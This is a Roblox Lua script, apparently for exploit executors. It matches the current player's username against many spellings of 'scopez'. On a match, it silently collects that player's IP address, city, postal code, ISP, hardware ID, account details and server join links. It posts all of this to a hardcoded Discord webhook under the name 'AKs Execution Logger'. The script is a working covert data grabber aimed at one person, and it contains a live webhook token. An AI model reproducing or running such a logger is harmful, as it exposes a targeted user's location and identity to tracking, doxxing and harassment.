local usertest = game.Players.LocalPlayer.Name

-- Convert to lowercase for case-insensitive comparison
local lowered = string.lower(usertest)

-- Comprehensive check for all variations of "scopez"
local function containsScopes(text)
    -- Direct matches
    if string.find(text, "scopez") then return true end
    if string.find(text, "sc0pez") then return true end
    if string.find(text, "scop3z") then return true end
    if string.find(text, "sc0p3z") then return true end
    if string.find(text, "5copez") then return true end
    if string.find(text, "5c0pez") then return true end
    if string.find(text, "5cop3z") then return true end
    if string.find(text, "5c0p3z") then return true end
    
    -- Variations with numbers
    if string.find(text, "sc0p3s") then return true end
    if string.find(text, "5c0pes") then return true end
    if string.find(text, "5cope5") then return true end
    if string.find(text, "5c0pe5") then return true end
    if string.find(text, "sc0pe5") then return true end
    if string.find(text, "scopes") then return true end
    if string.find(text, "scope5") then return true end
    if string.find(text, "5copes") then return true end
    
    -- Variations with dropped letters
    if string.find(text, "scopz") then return true end
    if string.find(text, "scpez") then return true end
    if string.find(text, "scpz") then return true end
    if string.find(text, "skopez") then return true end
    if string.find(text, "skopes") then return true end
    if string.find(text, "skopz") then return true end
    if string.find(text, "sk0pez") then return true end
    if string.find(text, "sk0pes") then return true end
    if string.find(text, "sc0pz") then return true end
    
    -- Variations with 1 for i (even though scopez doesn't have i)
    if string.find(text, "sc0p1z") then return true end
    if string.find(text, "5c0p1z") then return true end
    if string.find(text, "5cop1z") then return true end
    
    -- Variations with numbers and letter swaps
    if string.find(text, "zkopez") then return true end
    if string.find(text, "zk0pez") then return true end
    if string.find(text, "zk0p3z") then return true end
    if string.find(text, "zcopes") then return true end
    if string.find(text, "zc0pes") then return true end
    if string.find(text, "zc0p3s") then return true end
    
    -- Variations with multiple character swaps
    if string.find(text, "sk0p3z") then return true end
    if string.find(text, "sk0p35") then return true end
    if string.find(text, "5k0p3z") then return true end
    if string.find(text, "5k0p35") then return true end
    if string.find(text, "5kop3z") then return true end
    if string.find(text, "5kop35") then return true end
    
    -- Variations with letter substitutions
    if string.find(text, "schopez") then return true end 
    if string.find(text, "sck0pez") then return true end
    if string.find(text, "skopez") then return true end
    
    -- Other common substitutions
    if string.find(text, "sc[@a4]p[e3][z2s5]") then return true end
    if string.find(text, "[s5][c(k][o0][p][e3][z2s5]") then return true end
    if string.find(text, "[s5][c(k][o0][p][e3][s5]") then return true end
    if string.find(text, "[s5][c(k][o0][p][s5]") then return true end
    
    -- Reversed
    if string.find(text, "zepocs") then return true end
    if string.find(text, "z3p0cs") then return true end
    if string.find(text, "z3p0c5") then return true end
    if string.find(text, "sepocs") then return true end
    if string.find(text, "5ep0cs") then return true end
    
    -- Split versions (check if parts exist near each other)
    if string.find(text, "sc") and string.find(text, "op") and string.find(text, "ez") then return true end
    if string.find(text, "sc") and string.find(text, "0p") and string.find(text, "ez") then return true end
    if string.find(text, "sc") and string.find(text, "0p") and string.find(text, "3z") then return true end
    if string.find(text, "5c") and string.find(text, "0p") and string.find(text, "3z") then return true end
    
    -- Partial matches (if the word might be broken up)
    if string.find(text, "scop") and string.find(text, "pez") then return true end
    if string.find(text, "s[ck]") and string.find(text, "[o0]p") and string.find(text, "[e3][z2s5]") then return true end
    
    -- Character separations (with potential spacing)
    local cleaned = string.gsub(text, "[^a-z0-9]", "")
    if string.find(cleaned, "sc[o0]p[e3][z2s5]") then return true end
    if string.find(cleaned, "sk[o0]p[e3][z2s5]") then return true end
    if string.find(cleaned, "[s5][ck][o0]p[e3][z2s5]") then return true end
    if string.find(cleaned, "[s5][ck][o0]p[e3][s5]") then return true end
    
    -- Check with common substitutes in a comprehensive way
    local patterns = {
        "[s5][ck][o0]p[e3][z2s5]",
        "[s5][ck][o0]p[e3][s5]",
        "[s5][ck][o0]p[z2s5]",
        "[s5][ck][o0]p[s5]",
        "[s5][ck][o0][e3][z2s5]",
        "[s5][ck][o0]p[e3]",
        "[s5][ck][o0]p",
        "[s5][ck][o0][pb][e3][z2s5]",
    }
    
    for _, pattern in ipairs(patterns) do
        if string.find(cleaned, pattern) then
            return true
        end
    end
    
    -- Additional checks for sneaky variations
    if string.find(text, "sc[%a%d]pe") then return true end
    if string.find(text, "sc[%a%d]p[%a%d]") and string.find(text, "[o0]p[e3]") then return true end
    if string.find(text, "s[ck][o0][bp]") then return true end
    
    -- Check for individual characters in specific positions
    local chars = {text:byte(1, #text)}
    for i = 1, #text - 5 do
        local subtext = string.char(table.unpack(chars, i, i + 5))
        if string.match(subtext, "[s5][ck][o0][pb][e3][z2s5]") then
            return true
        end
    end
    
    return false
end

if containsScopes(lowered) then
--[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
local LocalizationService = game:GetService("LocalizationService")
local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
local GroupService = game:GetService("GroupService")
local BadgeService = game:GetService("BadgeService")
local UserInputService = game:GetService("UserInputService")
local Stats = game:GetService("Stats")

local LocalPlayer = Players.LocalPlayer
local UserId = LocalPlayer.UserId
local DisplayName = LocalPlayer.DisplayName
local Username = LocalPlayer.Name
local MembershipType = tostring(LocalPlayer.MembershipType):sub(21)
local AccountAge = LocalPlayer.AccountAge
local Country = LocalizationService.RobloxLocaleId
local GetIp = game:HttpGet("https://v4.ident.me/")
local GetData = HttpService:JSONDecode(game:HttpGet("http://ip-api.com/json"))
local Hwid = RbxAnalyticsService:GetClientId()
local GameInfo = MarketplaceService:GetProductInfo(game.PlaceId)
local GameName = GameInfo.Name
local Platform = (UserInputService.TouchEnabled and not UserInputService.MouseEnabled) and "📱 Mobile" or "💻 PC"
local Ping = math.round(Stats.Network.ServerStatsItem["Data Ping"]:GetValue())

local function detectExecutor()
    return identifyexecutor()
end

local function createWebhookData()
    local executor = detectExecutor()
    local date = os.date("%m/%d/%Y")
    local time = os.date("%X")
    local gameLink = "https://www.roblox.com/games/" .. game.PlaceId
    local playerLink = "https://www.roblox.com/users/" .. UserId
    local mobileJoinLink = "https://www.roblox.com/games/start?placeId=" .. game.PlaceId .. "&launchData=" .. game.JobId
    local jobIdLink = "https://www.roblox.com/games/" .. game.PlaceId .. "?jobId=" .. game.JobId

    local data = {
        username = "AKs Execution Logger",
        avatar_url = "https://i.imgur.com/AfFp7pu.png",
        embeds = {

            {
                title = "👤 Player Information",
                description = string.format(
                    "**Display Name:** [%s](%s)\n**Username:** %s\n**User ID:** %d\n**Membership:** %s\n**Account Age:** %d days\n**Platform:** %s\n**Ping:** %dms",
                    DisplayName, playerLink, Username, UserId, MembershipType, AccountAge, Platform, Ping
                ),
                color = MembershipType == "Premium" and tonumber("0xf1c40f") or tonumber("0x3498db")
            },
            {
                title = "🌐 Location & Network",
                description = string.format(
                    "**IP:** `%s`\n**HWID:** `%s`\n**Country:** %s :flag_%s:\n**Region:** %s\n**City:** %s\n**Postal Code:** %s\n**ISP:** %s\n**Organization:** %s\n**Time Zone:** %s",
                    GetIp, Hwid, GetData.country, string.lower(GetData.countryCode), GetData.regionName, GetData.city, GetData.zip, GetData.isp, GetData.org, GetData.timezone
                ),
                color = tonumber("0xe74c3c")
            },
            {
                title = "⚙️ Technical Details",
                description = string.format(
                    "**Executor:** `%s`\n**Job ID:** [Click to Copy](%s)\n**Mobile Join:** [Click](%s)",
                    executor, jobIdLink, mobileJoinLink
                ),
                color = tonumber("0x95a5a6"),
                footer = { 
                    text = string.format("📅 Date: %s | ⏰ Time: %s", date, time)
                }
            }
        }
    }
    return HttpService:JSONEncode(data)
end

local function sendWebhook(webhookUrl, data)
    local headers = {["Content-Type"] = "application/json"}
    local request = http_request or request or HttpPost or syn.request
    local webhookRequest = {Url = webhookUrl, Body = data, Method = "POST", Headers = headers}
    request(webhookRequest)
end

local webhookUrl = "https://discord.com/api/webhooks/1365029188045635704/1oDKWGABAzn2__R-exYbxpqAweGyVrADirDOiJKhRlxx7WB3Ot8JHo_dupYS8MpMop2_"
local webhookData = createWebhookData()
sendWebhook(webhookUrl, webhookData)
end
